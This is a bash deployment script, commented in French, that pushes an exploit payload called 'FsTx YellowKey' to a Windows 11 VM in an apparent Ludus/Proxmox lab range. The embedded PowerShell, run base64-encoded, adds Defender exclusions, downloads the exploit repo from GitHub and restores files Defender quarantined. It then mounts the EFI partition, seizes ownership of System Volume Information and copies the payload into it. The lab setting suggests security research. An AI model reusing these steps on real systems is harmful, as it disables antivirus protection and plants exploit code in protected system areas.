#!/usr/bin/env bash
#
# Deploie le payload FsTx YellowKey sur la VM cible.
#
# Etapes (executees via qm guest exec sur la VM) :
#   1. Telecharge le ZIP du repo YellowKey depuis GitHub
#   2. Ajoute des exclusions Defender pour les chemins concernes
#   3. Extrait, restaure les .blf depuis la quarantaine Defender si besoin
#   4. Monte la partition EFI temporairement sur Y:
#   5. Prend ownership de Y:\System Volume Information
#   6. Copie FsTx dans Y:\System Volume Information\FsTx
#
# A executer DEPUIS le Mac (ou tout client) avec sshpass + PVE_HOST/PVE_PASS exportes :
#
#   PVE_HOST=10.0.0.10 PVE_PASS='xxx' ./scripts/deploy-payload.sh yellowkey
#
# Le 1er arg est le range_id Ludus.

set -euo pipefail

PVE_HOST="${PVE_HOST:?Define PVE_HOST}"
PVE_PASS="${PVE_PASS:?Define PVE_PASS}"
PVE_USER="${PVE_USER:-root}"

RANGE_ID="${1:?Usage: $0 <range_id>}"
WIN11_VM="${RANGE_ID}-yk-win11"

pve() { sshpass -p "${PVE_PASS}" ssh -o StrictHostKeyChecking=accept-new "${PVE_USER}@${PVE_HOST}" "$@"; }

vmid=$(pve "qm list | awk -v n=\"${WIN11_VM}\" '\$2==n {print \$1}'")
if [[ -z "${vmid}" ]]; then
  echo "[!] VM ${WIN11_VM} introuvable cote Proxmox" >&2
  exit 1
fi
echo "[*] Target : ${WIN11_VM} (vmid=${vmid})"

# Le PowerShell est encode en base64 UTF-16LE et execute via -EncodedCommand
# (passe proprement les guillemets et chemins).
PS_SCRIPT=$(cat <<'PSEOF'
$ErrorActionPreference = 'Stop'

Write-Host "=== Step 1 : Defender exclusions (preventif) ==="
try {
  Add-MpPreference -ExclusionPath "C:\Windows\Temp\YellowKey-extract","C:\Windows\Temp\YellowKey.zip","Y:\" -Force -ErrorAction SilentlyContinue
} catch {}

Write-Host "=== Step 2 : Download YellowKey from GitHub ==="
$zip = "C:\Windows\Temp\YellowKey.zip"
if (Test-Path $zip) { Remove-Item $zip -Force }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri 'https://github.com/Nightmare-Eclipse/YellowKey/archive/refs/heads/main.zip' `
  -OutFile $zip -UseBasicParsing
Write-Host "Downloaded : $((Get-Item $zip).Length) bytes"

Write-Host "=== Step 3 : Extract ==="
$extractDir = "C:\Windows\Temp\YellowKey-extract"
if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
Expand-Archive -Path $zip -DestinationPath $extractDir -Force
$fstxSrc = (Get-ChildItem -Path $extractDir -Recurse -Directory -Filter 'FsTx' | Select-Object -First 1).FullName
Write-Host "FsTx source : $fstxSrc"

Write-Host "=== Step 4 : Restore .blf from Defender quarantine if needed ==="
$blfMissing = -not (Test-Path "$fstxSrc\95F62703B343F111A92A005056975458\FsTxLogs\FsTxLog.blf")
if ($blfMissing) {
  Write-Host "  .blf manquant -> restore via MpCmdRun.exe"
  $detection = Get-MpThreatDetection | Where-Object { $_.Resources -match 'FsTx' } | Select-Object -First 1
  if ($detection) {
    $threatName = (Get-MpThreat | Where-Object { $_.ThreatID -eq $detection.ThreatID }).ThreatName
    & "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -Restore -Name $threatName -All | Out-Null
  }
}

Write-Host "=== Step 5 : Mount EFI partition on Y: ==="
$vol = Get-CimInstance Win32_Volume | Where-Object { $_.FileSystem -eq 'FAT32' -and $_.Capacity -lt 1GB } | Select-Object -First 1
if (-not $vol) { throw "EFI partition introuvable" }
Set-CimInstance -InputObject $vol -Property @{DriveLetter='Y:'} -ErrorAction Stop
Start-Sleep -Seconds 2

Write-Host "=== Step 6 : Take ownership of Y:\System Volume Information ==="
$svi = "Y:\System Volume Information"
takeown /F $svi /A /R /D Y 2>&1 | Out-Null
icacls $svi /grant "Administrators:(OI)(CI)F" /grant "SYSTEM:(OI)(CI)F" /T /C 2>&1 | Out-Null

Write-Host "=== Step 7 : Copy FsTx into EFI SVI ==="
$dst = "$svi\FsTx"
if (Test-Path $dst) { Remove-Item $dst -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $dst -Force | Out-Null
robocopy $fstxSrc $dst /E /COPY:DT /R:0 /W:0 /NJH /NJS /NDL | Out-Null

Write-Host "=== Final : listing ==="
Get-ChildItem -Path $dst -Recurse -File | ForEach-Object { "{0,12} {1}" -f $_.Length, $_.FullName }

Write-Host "=== Dismount Y: ==="
Set-CimInstance -InputObject $vol -Property @{DriveLetter=$null} -ErrorAction SilentlyContinue
PSEOF
)

# Encode UTF-16LE base64
B64=$(printf '%s' "${PS_SCRIPT}" | iconv -f UTF-8 -t UTF-16LE | base64 | tr -d '\n')

echo "[*] Execution du payload PowerShell via qm guest exec (timeout 180s)..."
pve "qm guest exec ${vmid} --timeout 180 -- powershell.exe -NoProfile -EncodedCommand '${B64}'" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('out-data','')); err=d.get('err-data',''); print('---STDERR---', file=sys.stderr); print(err[-1500:] if 'Error' in err else '(no error)', file=sys.stderr)"
